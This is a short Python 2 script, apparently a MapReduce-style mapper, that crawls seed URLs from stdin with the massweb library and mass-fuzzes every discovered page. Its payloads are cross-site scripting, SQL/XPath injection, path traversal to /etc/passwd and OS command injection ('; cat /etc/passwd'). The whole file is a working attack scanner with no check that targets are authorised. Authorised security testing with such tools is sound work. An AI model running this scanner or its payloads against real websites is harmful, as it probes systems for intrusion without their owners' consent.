#!/usr/bin/python

import codecs
from urlparse import urlparse
import sys
from massweb.masscrawler.masscrawl import MassCrawl
from massweb.fuzzers.web_fuzzer import WebFuzzer
from massweb.payloads.payload import Payload

def fuzz(targets):

    xss_payload = Payload('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])
    sqli_xpathi_payload = Payload("')--#", check_type_list = ["sqli", "xpathi"])
    trav_payload = Payload('../../../../../../../../../../../../../../../../../../../../../../../etc/passwd', check_type_list = ["trav"])
    xpathi_payload = Payload('<!--', check_type_list = ["xpathi"])
    osci_payload = Payload('; cat /etc/passwd')

    wf = WebFuzzer(targets, num_threads = 30)

    wf.add_payload(xss_payload)
    wf.add_payload(sqli_xpathi_payload)
    wf.add_payload(trav_payload)
    wf.add_payload(xpathi_payload)
    wf.add_payload(osci_payload)

    wf.generate_fuzzy_targets()
    
    for r in wf.fuzz():
        yield r

def mapper():

    sys.stdin = codecs.getreader('utf-8')(sys.stdin)

    seeds = []
    for line in sys.stdin:
        url = line.strip("\n")
        seeds.append(url)

    mc = MassCrawl(seeds)
    for seed in seeds:
        mc.add_to_scope_from_url(seed)

    mc.crawl(depth = 3, num_threads = 10)

    results = fuzz(mc.targets)

    for result in results:

        domain = mc.get_domain_from_url(result.fuzzy_target.url)
        print unicode(domain) + unicode("\t") + unicode(result)

if __name__ == "__main__":
    mapper()
